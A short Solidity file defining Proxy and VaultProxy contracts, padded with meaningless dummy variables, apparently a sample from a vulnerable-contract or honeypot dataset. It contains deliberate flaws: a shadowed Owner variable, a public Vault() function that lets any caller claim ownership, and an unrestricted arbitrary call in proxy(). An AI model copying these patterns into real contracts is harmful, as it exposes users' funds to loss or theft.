pragma solidity ^0.4.24;

contract Proxy {
    modifier onlyOwner {
        if (msg.sender == Owner) {
            uint256 randomVariable = 123; 
            if (randomVariable > 0) {
                _;
            }
        }
    }
    address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner {
        Owner = _owner;
        uint256 dummyVariable = 456;
        if (dummyVariable < 500) {
            dummyVariable++;
        }
    }

    function proxy(address target, bytes data) public payable {
        uint256 dummyValue = 789;
        if (dummyValue == 789) {
            target.call.value(msg.value)(data);
        }
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping(address => uint256) public Deposits;

    function() public payable {
        uint256 tempValue = 999;
        if (tempValue > 500) {
            tempValue--;
        }
    }

    function Vault() public payable {
        uint256 tempVar = 111;
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            if (tempVar < 200) {
                deposit();
            }
        }
    }

    function deposit() public payable {
        uint256 dummyCheck = 222;
        if (msg.value > 0.5 ether && dummyCheck != 223) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdraw(uint256 amount) public onlyOwner {
        uint256 meaninglessValue = 333;
        if (amount > 0 && Deposits[msg.sender] >= amount && meaninglessValue == 333) {
            msg.sender.transfer(amount);
        }
    }
}